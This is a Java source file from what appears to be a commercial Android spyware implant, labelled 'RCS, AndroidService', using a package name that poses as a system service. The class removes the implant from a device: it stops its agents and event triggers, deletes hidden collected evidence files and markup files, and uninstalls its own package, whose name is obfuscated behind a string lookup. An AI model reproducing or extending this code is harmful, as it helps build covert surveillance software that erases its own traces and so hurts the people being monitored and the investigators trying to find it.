/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : UninstallAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import org.json.JSONObject;

import android.content.Intent;
import android.net.Uri;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAction;
import com.android.service.evidence.EvidenceCollector;
import com.android.service.evidence.Markup;
import com.android.service.manager.ManagerAgent;
import com.android.service.manager.ManagerEvent;
import com.android.service.util.Check;

/**
 * The Class UninstallAction.
 */
public class UninstallAction extends SubActionSlow {

	private static final String TAG = "UninstallAction"; //$NON-NLS-1$

	/**
	 * Instantiates a new uninstall action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public UninstallAction(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		actualExecute();
		return true;
	}

	/**
	 * Actual execute.
	 */
	public static boolean actualExecute() {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualExecute): uninstall") ;//$NON-NLS-1$
		}
		final Markup markup = new Markup(0);
		markup.createEmptyMarkup();

		boolean ret = stopServices();
		ret &= removeFiles();
		ret &= deleteApplication();

		return ret;
	}

	/**
	 * Stop agents and events
	 * 
	 * @return
	 */
	static boolean stopServices() {
		if (Cfg.DEBUG) {
			Check.log( TAG + " (stopServices)") ;//$NON-NLS-1$
		}
		
		ManagerAgent.self().stopAll();
		ManagerEvent.self().stopAll();
		Status.self().unTriggerAll();
		return true;
	}

	/**
	 * Remove markups and logs
	 * 
	 * @return
	 */
	static boolean removeFiles() {
		if (Cfg.DEBUG) {
			Check.log( TAG + " (removeFiles)") ;//$NON-NLS-1$
		}
		
		Markup.removeMarkups();

		final int fileNum = EvidenceCollector.self().removeHidden();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeFiles): " + fileNum) ;//$NON-NLS-1$
		}
		return true;
	}

	/**
	 * Deletes the application
	 * 
	 * @return
	 */
	static boolean deleteApplication() {
		if (Cfg.DEBUG) {
			Check.log( TAG + " (deleteApplication)") ;//$NON-NLS-1$
		}

		final Uri packageURI = Uri.parse(Messages.getString("2.0")); //$NON-NLS-1$

		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		Status.getAppContext().startActivity(uninstallIntent);
		return true;
	}

	@Override
	protected boolean parse(ConfAction params) {
		return true;
	}

}
